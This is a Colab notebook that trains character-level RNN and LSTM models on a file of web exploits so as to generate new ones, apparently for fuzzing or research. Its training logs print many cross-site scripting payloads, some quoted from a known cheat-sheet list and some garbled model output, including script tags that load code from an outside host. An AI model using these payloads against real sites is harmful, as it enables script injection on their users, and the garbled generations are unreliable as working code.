{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "rnn_lstm_gru_impl.py",
      "provenance": [],
      "collapsed_sections": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "source": [
        "# Imports \n",
        "This project is implemented using tensorflow vesion 2.7.0 and numpy version 1.19.5 "
      ],
      "metadata": {
        "id": "4uN9mdMlZwcK"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import sys \n",
        "import random \n",
        "import numpy as np \n",
        "import tensorflow as tf\n",
        "from tensorflow.keras import layers, models  \n",
        "\n",
        "print(tf.__version__)\n",
        "print(np.__version__)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "jx7UCJdHZ2_R",
        "outputId": "67813103-d130-4d5f-aa9f-1f69ce342cc6"
      },
      "execution_count": 2,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "2.7.0\n",
            "1.19.5\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Data Preprocessing \n",
        "Once we load our data we will create a vocabulary which is composed unique characters from the data. One thing to note here is that these exploits will include a number of special characters and we have to keep them in there ans sometimes even upper case letter. They are part of the more diversified exploit content. We just load the data and vectorize its content\n",
        "### Vectorization\n",
        "Inorder to feed our data we have to convert the string form of the data into numeric tensors or numeric vectors. for this we can use StringLookup layer form tensorflow or do it manually using simple dictionary operations. Inorder to convert generated numeric IDs into human readable form we can use the StringLookup layer of tensorflow with invert parameter set to True.      \n",
        "\n",
        "```\n",
        "# without tensorflow \n",
        "chars_to_indices = tf.keras.layers.StringLookup(\n",
        "    vocabulary=list(vocabulary), mask_token=None)\n",
        "\n",
        "indices_to_chars = tf.keras.layers.StringLookup(\n",
        "    vocabulary=chars_to_indices.get_vocabulary(), invert=True, mask_token=None\n",
        ")\n",
        "```\n",
        "\n",
        "# Character Mappings \n",
        "mapping character is just giving a unique id to a character from the data we just loaded ofcourse for those which are unique. This is important later when we feed the data into our model. The model will use the ids to map each character thats coming through the sequence.  "
      ],
      "metadata": {
        "id": "sWylYINJa9fD"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# Read our data \n",
        "data = \"\"\n",
        "with open(\"./file.txt\", 'r', encoding='utf-8') as f:\n",
        "  data += f.read()\n",
        "\n",
        "# Create  our vocabulary \n",
        "vocabulary = sorted(list(set(data)))\n",
        "print(f\"Length our vocabulary {len(vocabulary)}\")\n",
        "\n",
        "# Create mapping chars to indices and reverse indices to chars \n",
        "chars_to_indices = dict((c, i) for i, c in enumerate(vocabulary))\n",
        "indices_to_chars = dict((i, c) for i, c in enumerate(vocabulary))"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "2j2Urs2ecH0A",
        "outputId": "25c486d3-3553-4fe7-b8a5-cbf2676bc38c"
      },
      "execution_count": 6,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Length our vocabulary 115\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Split the data into training examples and targets \n",
        "\n",
        "The data is splitted into smaller sequences of a fixed length which makes all input sequences the same length and one character shifted to the right. The shifted character will be the target value which we want to predict.\n",
        "\n",
        "```\n",
        "# with Tensorflow\n",
        "# get the mapping of all characters from our input file \n",
        "vector_data = chars_to_indices(tf.strings.unicode_split(data, 'UTF-8')) \n",
        "\n",
        "vector_dataset = tf.data.Dataset.from_tensor_slices(vector_data)\n",
        "```\n",
        "\n"
      ],
      "metadata": {
        "id": "Xq-m-p8og4gO"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Create a batch of characters \n",
        "the batch method of tensorflow creates a sequence of characters with desired length in this case the sequence length is set to 200\n",
        "\n",
        "\n",
        "\n",
        "```\n",
        "# Tensorflow implementation \n",
        "\n",
        "seq_length = 200\n",
        "sequences = vector_dataset.batch(seq_length+1, drop_remainder=True)\n",
        "\n",
        "# utility function to split input sequence into sample and target \n",
        "def split_sequence(sequence):\n",
        "  in_seq = sequence[:-1]\n",
        "  target_seq = sequence[1:]\n",
        "  return in_seq, target_seq\n",
        "\n",
        "# then create dataset of input sample and target over the entire sequence \n",
        "new_dataset = sequences.map(split_sequence)\n",
        "\n",
        "```\n",
        "\n"
      ],
      "metadata": {
        "id": "DQ6g-qQwoRc7"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "seq_length = 200\n",
        "step = 3\n",
        "sequences = []\n",
        "next_chars = []\n",
        "for i in range(0, len(data) - seq_length, step):\n",
        "    sequences.append(data[i: i + seq_length])\n",
        "    next_chars.append(data[i + seq_length])"
      ],
      "metadata": {
        "id": "oIr43TCUovxW"
      },
      "execution_count": 10,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Create One-Hot-Encoding matrix for X and Y\n",
        "\n",
        "After the sequences are created we want to make sure that these sequences are in the right form for our model by encoding them. One-Hot-Encoding scheme is used where each character i from our vocabulary is represented in the form of binary 0 and 1. To denore the i-th word from our vector, the value at the i-th element is set to 1 where all other values are set to 0.\n",
        "\n",
        "One thing to note here the X stores encode form of a sequence which is shifted by one and the y store the shifted character to represent the next incoming character from the input X sequence. As an example \n",
        "\n",
        "\n",
        "\n",
        "```\n",
        "+----------------------------------------------+-----+\n",
        "| [', ;, a, =, p, r, o, m, p, t, a, (, ), / ]  | [/] |\n",
        "+----------------------------------------------+-----+\n",
        "\n",
        "# or as a hello\n",
        "+--------------+-------+\n",
        "|      X       |   Y   |\n",
        "+--------------+-------+\n",
        "| [h, e, l, l] | [o]   |\n",
        "| [e, l, l, o] | [ ]   |\n",
        "| [l, l, o,  ] | [i]   |\n",
        "| [l, o,  , i] | [n]   |\n",
        "| ...          | ...   |\n",
        "+--------------+-------+\n",
        "```\n",
        "\n"
      ],
      "metadata": {
        "id": "KxDchaosohHO"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "x = np.zeros((len(sequences), seq_length, len(vocabulary)), dtype=np.bool)\n",
        "y = np.zeros((len(sequences), len(vocabulary)), dtype=np.bool)\n",
        "for i, sequence in enumerate(sequences):\n",
        "    for t, char in enumerate(sequence):\n",
        "        x[i, t, chars_to_indices[char]] = 1\n",
        "    y[i, chars_to_indices[next_chars[i]]] = 1"
      ],
      "metadata": {
        "id": "mzWLYqxuoonl"
      },
      "execution_count": 11,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Building the model "
      ],
      "metadata": {
        "id": "C9U__dVurWu4"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "vocab_length = len(vocabulary) # 116\n",
        "embedding_dimension = 256 \n",
        "units = 128\n",
        "\n",
        "def build_rnn_model():\n",
        "  model = models.Sequential()\n",
        "  model.add(layers.SimpleRNN(units, input_shape=(seq_length, vocab_length), return_sequences=True))\n",
        "  model.add(layers.Dropout(0.2))\n",
        "  model.add(layers.SimpleRNN(units))\n",
        "  model.add(layers.Dropout(0.2))\n",
        "  model.add(layers.Dense(vocab_length, activation='softmax'))\n",
        "  model.compile(loss='categorical_crossentropy', optimizer='rmsprop')\n",
        "  return model \n",
        "\n",
        "\n",
        "def build_lstm_model():\n",
        "  model = models.Sequential()\n",
        "  model.add(layers.LSTM(units, input_shape=(seq_length, vocab_length), return_sequences=True))\n",
        "  model.add(layers.Dropout(0.2))\n",
        "  model.add(layers.LSTM(units))\n",
        "  model.add(layers.Dropout(0.2))\n",
        "  model.add(layers.Dense(vocab_length, activation='softmax'))\n",
        "  model.compile(loss='categorical_crossentropy', optimizer='rmsprop')\n",
        "  return model"
      ],
      "metadata": {
        "id": "5v0tgpY3qgoT"
      },
      "execution_count": 23,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        ""
      ],
      "metadata": {
        "id": "uAiYzWe99tEq"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "rnn_model = build_rnn_model()\n",
        "rnn_model.summary()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Tdz-6PAPtksU",
        "outputId": "db0bc9bb-d542-4e76-f194-b80b26938062"
      },
      "execution_count": 24,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Model: \"sequential_5\"\n",
            "_________________________________________________________________\n",
            " Layer (type)                Output Shape              Param #   \n",
            "=================================================================\n",
            " simple_rnn_5 (SimpleRNN)    (None, 200, 128)          31232     \n",
            "                                                                 \n",
            " dropout_11 (Dropout)        (None, 200, 128)          0         \n",
            "                                                                 \n",
            " simple_rnn_6 (SimpleRNN)    (None, 128)               32896     \n",
            "                                                                 \n",
            " dropout_12 (Dropout)        (None, 128)               0         \n",
            "                                                                 \n",
            " dense_4 (Dense)             (None, 115)               14835     \n",
            "                                                                 \n",
            "=================================================================\n",
            "Total params: 78,963\n",
            "Trainable params: 78,963\n",
            "Non-trainable params: 0\n",
            "_________________________________________________________________\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "lstm_model = build_lstm_model()\n",
        "lstm_model.summary()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "bayUbDKoYcsK",
        "outputId": "b862a710-421d-4454-e3b1-7546ea91c9ba"
      },
      "execution_count": 25,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Model: \"sequential_6\"\n",
            "_________________________________________________________________\n",
            " Layer (type)                Output Shape              Param #   \n",
            "=================================================================\n",
            " lstm_6 (LSTM)               (None, 200, 128)          124928    \n",
            "                                                                 \n",
            " dropout_13 (Dropout)        (None, 200, 128)          0         \n",
            "                                                                 \n",
            " lstm_7 (LSTM)               (None, 200, 128)          131584    \n",
            "                                                                 \n",
            " dropout_14 (Dropout)        (None, 200, 128)          0         \n",
            "                                                                 \n",
            " lstm_8 (LSTM)               (None, 700)               2321200   \n",
            "                                                                 \n",
            " dropout_15 (Dropout)        (None, 700)               0         \n",
            "                                                                 \n",
            " dense_5 (Dense)             (None, 115)               80615     \n",
            "                                                                 \n",
            "=================================================================\n",
            "Total params: 2,658,327\n",
            "Trainable params: 2,658,327\n",
            "Non-trainable params: 0\n",
            "_________________________________________________________________\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import os\n",
        "# Directory where the checkpoints will be saved\n",
        "checkpoint_dir = './training_checkpoints'\n",
        "# Name of the checkpoint files\n",
        "checkpoint_prefix = os.path.join(checkpoint_dir, \"ckpt_{epoch}\")\n",
        "\n",
        "checkpoint_callback = tf.keras.callbacks.ModelCheckpoint(\n",
        "    filepath=checkpoint_prefix,\n",
        "    save_weights_only=True)\n",
        "\n",
        "def sample(preds, temperature=1.0):\n",
        "    # helper function to sample an index from a probability array\n",
        "    preds = np.asarray(preds).astype('float64')\n",
        "    preds = np.log(preds) / temperature\n",
        "    exp_preds = np.exp(preds)\n",
        "    preds = exp_preds / np.sum(exp_preds)\n",
        "    probas = np.random.multinomial(1, preds, 1)\n",
        "    return np.argmax(probas)\n",
        "\n",
        "\n",
        "class SampleExploit(tf.keras.callbacks.Callback):\n",
        "    def on_epoch_end(self, batch, logs={}):\n",
        "        start_index = random.randint(0, len(data) - seq_length - 1)\n",
        "\n",
        "        for diversity in [0.5, 1.2]:\n",
        "            generated = ''\n",
        "            sentence = data[start_index: start_index + seq_length]\n",
        "            generated += sentence\n",
        "            sys.stdout.write(generated)\n",
        "            for i in range(200):\n",
        "                x_pred = np.zeros((1, seq_length, len(vocabulary)))\n",
        "                for t, char in enumerate(sentence):\n",
        "                    x_pred[0, t, chars_to_indices[char]] = 1.\n",
        "                preds = rnn_model.predict(x_pred, verbose=0)[0]\n",
        "                next_index = sample(preds, diversity)\n",
        "                next_char = indices_to_chars[next_index]\n",
        "                generated += next_char\n",
        "                sentence = sentence[1:] + next_char\n",
        "                sys.stdout.write(next_char)\n",
        "                sys.stdout.flush()\n",
        "            print()\n",
        "\n"
      ],
      "metadata": {
        "id": "EdSBBioOtmpG"
      },
      "execution_count": 28,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "EPOCHS = 20 \n",
        "history = rnn_model.fit(x, y , epochs=EPOCHS, batch_size=80, callbacks=[SampleExploit()])"
      ],
      "metadata": {
        "id": "zhJb6bI8qQAl",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "8f040fb5-3bd0-498d-a7f9-1cb681d911bd"
      },
      "execution_count": 29,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Epoch 1/20\n",
            "764/764 [==============================] - ETA: 0s - loss: 1.854861' ; \\u0074\\u0068\\u0072\\u006F\\u0077 ~ \\u0074\\u0068\\u0069\\u0073. \\u0061\\u006C\\u0065\\u0072\\u0074(~'\\u0061')</script U+\n",
            "<script/src=\"data&colon;text%2Fj\\u0061v\\u0061script,\\u0061lert('\\u0061')\"></script>\n",
            "<script>\n",
            "<script>\n",
            "<img src=&#x0000\\&#1000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000011)&#x0001)&\n",
            "61' ; \\u0074\\u0068\\u0072\\u006F\\u0077 ~ \\u0074\\u0068\\u0069\\u0073. \\u0061\\u006C\\u0065\\u0072\\u0074(~'\\u0061')</script U+\n",
            "<script/src=\"data&colon;text%2Fj\\u0061v\\u0061script,\\u0061lert('\\u0061')\"></script=<nlotOlaersars(j8'asct(#))<><Z073m><)V<iSC IPT>\n",
            "\"lMDIdDSC2LC=&#1!6C%XB%4Q%2c=\"aalert(')>></sciipt>\"//m'\n",
            "\\4.;v vagt&lerSIC;-UoE0NPC=,IYn^;alert(17\" ivComc\\R8C=8%58;%T/&qksa0&#180>&#10AA>\\0x7s\\xck&lx:\"\n",
            "764/764 [==============================] - 357s 467ms/step - loss: 1.8548\n",
            "Epoch 2/20\n",
            "764/764 [==============================] - ETA: 0s - loss: 1.6181E2\\x80\\x8Aexpression(javascript:alert(1)\">DEF\n",
            "ABC<div style=\"x:\\x0Dexpression(javascript:alert(1)\">DEF\n",
            "ABC<div style=\"x:\\x0Cexpression(javascript:alert(1)\">DEF\n",
            "ABC<div style=\"x:\\xE2\\x80\\x87expression(javascript:alert(1)</script>\n",
            "\"`'</script src=\"x s=\"><script>\n",
            "<act ht l er=\" ontrale=\"javascript:alert(1)\"></srlert>\n",
            "<script x=\"javascript:alert(1)\"></script>\n",
            "\">\n",
            "<img src=\"http://ha.ckers.org/xss.jscas\n",
            "E2\\x80\\x8Aexpression(javascript:alert(1)\">DEF\n",
            "ABC<div style=\"x:\\x0Dexpression(javascript:alert(1)\">DEF\n",
            "ABC<div style=\"x:\\x0Cexpression(javascript:alert(1)\">DEF\n",
            "ABC<div style=\"x:\\xE2\\x80\\x87expression(\n",
            "7ofｅst%01)'>\n",
            "<s&gk&#x00&#94;&#07\\:1\\46: Cure(htolscript:alert(1)</sscimenmassropt.itgt\"0c I/*O-Dvv C_yYu:me=\\x9Yer4\"><sir NT><esvyiv ouu0076Nk00xCru,0k:\\x82\\j0TNx.9&#B0&H2’impBx14\">\n",
            "<`FROTF[E@=Ga^\n",
            "\\5\n",
            "764/764 [==============================] - 363s 475ms/step - loss: 1.6181\n",
            "Epoch 3/20\n",
            "764/764 [==============================] - ETA: 0s - loss: 1.4883=\"javascript:alert(1)\">\n",
            "<img \\x00src=x onerror=\"javascript:alert(1)\">\n",
            "<img src\\x09=x onerror=\"javascript:alert(1)\">\n",
            "<img src\\x10=x onerror=\"javascript:alert(1)\">\n",
            "<img src\\x13=x onerror=\"javascript:alert(1)\">\n",
            "<inrome></s></a>\n",
            "<a href=\"\\x12\n",
            "xponeoror=\"javascript:alert(1)\"></impte>\n",
            "<style></script>\n",
            "<script>\"></malert(1)\">\n",
            "<img src=xxs:jsva>\n",
            "<a htef=\"javascript:alert(1)\">\n",
            "<img src=xxx:x onerror=\"javas\n",
            "=\"javascript:alert(1)\">\n",
            "<img \\x00src=x onerror=\"javascript:alert(1)\">\n",
            "<img src\\x09=x onerror=\"javascript:alert(1)\">\n",
            "<img src\\x10=x onerror=\"javascript:alert(1)\">\n",
            "<img src\\x13=x onerror=\"javascript:alert(1)*>\">\n",
            "<BTC-M ha REUB>\n",
            "\"a'>\n",
            "'mpess.\"sc/javascript:5ovusiJiht 0:.eu4?(ascript:alert(';ut>\n",
            "</B`Y></abeieg or=\"xps:ssss3D></s>ript&vtod;doc=Mey1>\n",
            "'vcumpariod),8\")\"\\\"><\n",
            "xA//h><per>\n",
            "<imptescoipt<s onboc\n",
            "764/764 [==============================] - 367s 480ms/step - loss: 1.4883\n",
            "Epoch 4/20\n",
            "764/764 [==============================] - ETA: 0s - loss: 1.4073on(javascript:alert(1)\">DEF\n",
            "ABC<div style=\"x:\\x09expression(javascript:alert(1)\">DEF\n",
            "ABC<div style=\"x:\\xE3\\x80\\x80expression(javascript:alert(1)\">DEF\n",
            "ABC<div style=\"x:\\xE2\\x80\\x84expression(javascript:alert(1)</script>\n",
            "<script>\n",
            "<script src=\"http://hamckers.org/xss.col/script>\n",
            "<script>\n",
            "<script>\n",
            "<icriframe></sryle><img src=\"http://www.securlorimlert('><img src=\"javascript:alert(1)\"></imppteltertyle=\n",
            "on(javascript:alert(1)\">DEF\n",
            "ABC<div style=\"x:\\x09expression(javascript:alert(1)\">DEF\n",
            "ABC<div style=\"x:\\xE3\\x80\\x80expression(javascript:alert(1)\">DEF\n",
            "ABC<div style=\"x:\\xE2\\x80\\x84expression(javascript:alert(1\">\n",
            "<img onpers.rossim//j9v)6g>\n",
            "<SQRihkt0\\0`0006#00001/\";\n",
            "93X;/h>\n",
            "<BFRYxEA;\n",
            "|L&le;hieg><irgg'>>!\\\"r;chrimg srcos=\"javascript:alert(1XSS3)>\n",
            "\"fH'&T<YVw;do umentmcnmonmendovuj va \\Y,A ET^=\"javascr\n",
            "764/764 [==============================] - 369s 483ms/step - loss: 1.4073\n",
            "Epoch 5/20\n",
            "764/764 [==============================] - ETA: 0s - loss: 1.3470rt(1)\"></image>\n",
            "<object src=1 href=1 onerror=\"javascript:alert(1)\"></object>\n",
            "<script src=1 href=1 onerror=\"javascript:alert(1)\"></script>\n",
            "<svg onResize svg onResize=\"javascript:javascript:alert(1)\"></script>\n",
            "<script src=\" onerror=javascript:javascript:alert(1)\"></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83))\">\n",
            "<IMG SRC=x onelert('XSS');\">\n",
            "<IMG SRC=x ont ont hatle httlabesscript:\">\n",
            "<script>\n",
            "<\n",
            "rt(1)\"></image>\n",
            "<object src=1 href=1 onerror=\"javascript:alert(1)\"></object>\n",
            "<script src=1 href=1 onerror=\"javascript:alert(1)\"></script>\n",
            "<svg onResize svg onResize=\"javascript:javascript:alert(1)\"></Acrquot;hcripy/ejx.ancript:alert(1)\">D>\n",
            "<! SRC=javascript:alert(C)jKvascript:alert(1)></script/4%6APDg=\"javascript:javascript:alert(1)*//1]2(\"se\"=\"lert(*\n",
            "<int7xrimppreshiog:9PcOAUy><YT2PEDa><icr prd(`\n",
            "764/764 [==============================] - 364s 477ms/step - loss: 1.3470\n",
            "Epoch 6/20\n",
            "764/764 [==============================] - ETA: 0s - loss: 1.2972ument.vulnerable=true;</script>\n",
            "<![<!--]]<script>document.vulnerable=true;//--></script>\n",
            "<!-- -- --><script>document.vulnerable=true;</script><!-- -- -->\n",
            "<img src=\"blah\"onmouseover=\"document.vulnerable=true;\">\n",
            "<style></script>\n",
            "<script src=\"&gt;\n",
            "&lt;SCRIPT SRC=\" onload=\"javascript:document.vulnerable=true;</SCRIPT>\n",
            "\"`'><script>javascript:alert('XSS');\">\n",
            "<IMG SRC=x onL=\"donforment sryle=\"xes\">\n",
            "<scri\n",
            "ument.vulnerable=true;</script>\n",
            "<![<!--]]<script>document.vulnerable=true;//--></script>\n",
            "<!-- -- --><script>document.vulnerable=true;</script><!-- -- -->\n",
            "<img src=\"blah\"onmouseover=\"document.vulnerabliptrre)\">\n",
            "<ivlE\n",
            "<img>\n",
            "<`pa> <omgte&conLon:seriminp:ssrridlcaiM &#56;</B?%xstyle onLoad>\n",
            "<l gm estyintneruｘl>=\"alert(S6Y*E)');/\\\"0;g*/\"F;/sconpttmp<rk;bodecropbsh/quetron=\"aseriptpxtkhemC d=\"xsBOiareal\n",
            "764/764 [==============================] - 368s 481ms/step - loss: 1.2972\n",
            "Epoch 7/20\n",
            "764/764 [==============================] - ETA: 0s - loss: 1.257629';\\0029\";>;\n",
            "<;IMG SRC=&;#x6A&;#x61&;#x76&;#x61&;#x73&;#x63&;#x72&;#x69&;#x70&;#x74&;#x3A&;#x61&;#x6C&;#x65&;#x72&;#x74&;#x28&;#x27&;#x58&;#x53&;#x53&;#x27&;#x29>;\n",
            "<;HEAD>;<;META HTTP-EQUIV=\";CONTENT=\";);&quot;&gt;\n",
            "&lt;IMG SRC=x onlor==javascript:alert(1)</script>\n",
            "<script>\n",
            "<img src=xxx:x onerror=\"javascript:alert(1);\n",
            "<script for=\"javascript:alert(1)/\">\n",
            "<IMG SRC=x onefromC=\" onme s></SCRIPT>\n",
            "<scri\n",
            "29';\\0029\";>;\n",
            "<;IMG SRC=&;#x6A&;#x61&;#x76&;#x61&;#x73&;#x63&;#x72&;#x69&;#x70&;#x74&;#x3A&;#x61&;#x6C&;#x65&;#x72&;#x74&;#x28&;#x27&;#x58&;#x53&;#x53&;#x27&;#x29>;\n",
            "<;HEAD>;<;META HTTP-EQUIV=\";CONTENT=blexslOUODRqaleat(ht;`&NawLA&gM;\n",
            "GSCUNPTTSOANELRT;hade(TTMLEF<fomalert(;XSS';)\";E[/;N;-ODVSSCR&#(1;ht&#01Bi t<vOpT /T=';bloalept9\";javascript:alert(1)&\">;\n",
            "\n",
            "&axo\\utE,V&le*L Ek SCY=xxxD- YYTyenb3s=lon=\n",
            "764/764 [==============================] - 368s 481ms/step - loss: 1.2576\n",
            "Epoch 8/20\n",
            "764/764 [==============================] - ETA: 0s - loss: 1.2283ckground-image: url(javascript:alert('XSS'))\">\n",
            "<DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\007r\\006C\\0073\\0068\\0072\\0071\\0061\\0072\\0072\\0069\\0070\\006C\\0079\\0074\\006C\\0072\\0069\\0072\\0072\\0072\\006C\\0068\\0074\\0074\\006C\\0068\\0072\\0072\\0074\\0074\\0074\\0072\\006C\\0072\\007u\\007\\\\006C\\006C\\006C\\0072\\00\n",
            "ckground-image: url(javascript:alert('XSS'))\">\n",
            "<DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\008.wa#@6g0;T0C4);%23>\n",
            "<^>\n",
            "</IVMg ITY=:uefDodphemthtyl \\\"MY\"E% onsrrodod=\"javascriwt&amavg/srg=\" ' inn(\"aL-id=\"rRidisc:datedocuuentacu#=davascript\\ajavascript:sof=\"javascr javascrip::japaser`pin8-cTnMGT\n",
            "764/764 [==============================] - 370s 484ms/step - loss: 1.2283\n",
            "Epoch 9/20\n",
            "764/764 [==============================] - ETA: 0s - loss: 1.2073e=true;\">\n",
            "<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=document.vulnerable=true;>\n",
            "<<SCRIPT>document.vulnerable=true;//<</SCRIPT>\n",
            "<script <B>document.vulnerable=true;</script>\n",
            "<img SRC=\"javascript:document.vulnerable=true;\">\n",
            "<iframe src=\"javascript:alert(1)>\n",
            "`\"'><img/src=x onerror=\"javascript:alert(1)\"></script>\n",
            "<img src=\"javascript:alert(1)</script>\n",
            "<img src=\"javascript:alert(1)\"></script>\n",
            "<script>\n",
            "<scri\n",
            "e=true;\">\n",
            "<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=document.vulnerable=true;>\n",
            "<<SCRIPT>document.vulnerable=true;//<</SCRIPT>\n",
            "<script <B>document.vulnerable=true;</script>\n",
            "<img SRC=\"javascript:document.vuln:8='coNf=&javascript:alert(1)>\n",
            "\"\" '!#fu\">`35xsrclAag/on[Nad SConRdjav;/jjvar&58b!szjeyme/1.jevrscript>#0031)\\\";;sin/tAc\\s/Pim(\n",
            "/<csrifoaullit''a:text>homgbonyondocmindoquonfe%if(amlja.8sorercose=:ja\n",
            "764/764 [==============================] - 370s 484ms/step - loss: 1.2073\n",
            "Epoch 10/20\n",
            "764/764 [==============================] - ETA: 0s - loss: 1.1833>\n",
            "<IMG SRC=x onended=\"alert(String.fromCharCode(88,83,83))\">\n",
            "<IMG SRC=x onerror=\"alert(String.fromCharCode(88,83,83))\">\n",
            "<IMG SRC=x onloadeddata=\"alert(String.fromCharCode(88,83,83))\">\n",
            "<IMG SRC=x onload onload=\"javascript:alert(1)\"></img src=\"javascript:alert(1)\"></iframe></script>\n",
            "<script>\n",
            "<script>\n",
            "<script src=\" onerror=\"javascript:alert(1)\"></body onFocur=\"javascript:alert(1)\"></body onkersingtsr\n",
            ">\n",
            "<IMG SRC=x onended=\"alert(String.fromCharCode(88,83,83))\">\n",
            "<IMG SRC=x onerror=\"alert(String.fromCharCode(88,83,83))\">\n",
            "<IMG SRC=x onloadeddata=\"alert(String.fromCharCode(88,83,83))\">\n",
            "<IMG SRC=x onload==are\"4(\"ngconpert:h/(\n",
            "';XSS&#as;http&et61;&quot;1exto/srioA=\"b>;QoLiante.ous>;</oFRAty IFTAFE9>\n",
            "<d>\n",
            "<l: bEalir. orCox /Xxcldsc></s>yle>\n",
            "<dX</b)><frament.crim=\"arerhanl=0{wla=\"XSS\")>\n",
            "<img src=xhtt`Yy\n",
            "764/764 [==============================] - 368s 482ms/step - loss: 1.1833\n",
            "Epoch 11/20\n",
            "764/764 [==============================] - ETA: 0s - loss: 1.1647TTP-EQUIV=\\\"CONTENT-TYPE\\\" CONTENT=\\\"text/html; charset=UTF-7\\\"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\n",
            "&lt;SCRIPT a=\\\"&gt;\\\" SRC=\\\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\\\"); &gt;\n",
            "&lt;IMG SRC=javascript:alert(1)\"></ipg><script>\\xE2\\x83\\x81extrexsroos=\"javascript:alert(1)\"></ion;alert(1)\"></iprime>\n",
            "<img src=\">javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n",
            "<a href=\"\\xE2\\\n",
            "TTP-EQUIV=\\\"CONTENT-TYPE\\\" CONTENT=\\\"text/html; charset=UTF-7\\\"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\n",
            "&lt;SCRIPT a=\\\"&gt;\\\" SRC=\\\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\\\");<;wSRSC&quot;\"></Icripr></inroapssibndocument.ll=\"t ht<Es.;</script></ifrome>\n",
            "<iataserhef/1inpomen(.jU>Bit/--><-script>{lidO-U9).<scr pnstyleadylouk=%;\"xscript\">t</*CS STYUEO&quot;nval\n",
            "http:</sww.as\n",
            "764/764 [==============================] - 370s 484ms/step - loss: 1.1647\n",
            "Epoch 12/20\n",
            "764/764 [==============================] - ETA: 0s - loss: 1.1448<TABLE BACKGROUND=\"javascript:alert('XSS')\">\n",
            "<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">\n",
            "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">\n",
            "<DIV STYLE=\"background-image:\\0075\\0072\\006C\\0061\\0072\\0074\\0074\\0074\\0074\\0074\\0072\\006C\\0072\\006C\\006c\\006C\\0072\\0061\\0072\\0061\\007o\\0061\\007o\\0060\\0074\\007C\\0074\\0061\\007o\\0061\\007o\\0069\\0072\\006C\\006C\\006C\\006C\\006C\\0072\\0069\\0074\\0074\\0072\\\n",
            "<TABLE BACKGROUND=\"javascript:alert('XSS')\">\n",
            "<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">\n",
            "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">\n",
            "<DIV STYLE=\"background-image:\\0075\\0072\\006C\\0020'0000000380006C</script>\n",
            "<img>><1<svfre lbry=14xprestyle=\"jevassr4-0/hw>/nexposfrnmC/)*9l/arEg src=XSida '=tavewrrserhgty=javescript>&ome;&#{b;ckg&#10;'j vascript:alert(1)\n",
            "<asscript<ssript>\n",
            "<inFlo\n",
            "764/764 [==============================] - 371s 485ms/step - loss: 1.1448\n",
            "Epoch 13/20\n",
            "764/764 [==============================] - ETA: 0s - loss: 1.1281('XSS')\">\n",
            "<IMG DYNSRC=\"javascript:alert('XSS')\">\n",
            "<IMG LOWSRC=\"javascript:alert('XSS')\">\n",
            "<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS</br>\n",
            "<IMG SRC='vbscript:msgbox(6javascript:alert(1)\" id=\"fuzzelement1\">test</a>\n",
            "<a href=\"\\x0Djavascript:alert(1)\"></script>\n",
            "<script>\n",
            "<ivg \\x09\\x12\\x80\\x8Ajavascript:alert(1)\"></body onPreder on=\"alert(1)\" id=\"fuzzelement1\">test</a>\n",
            "('XSS')\">\n",
            "<IMG DYNSRC=\"javascript:alert('XSS')\">\n",
            "<IMG LOWSRC=\"javascript:alert('XSS')\">\n",
            "<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS</br>\n",
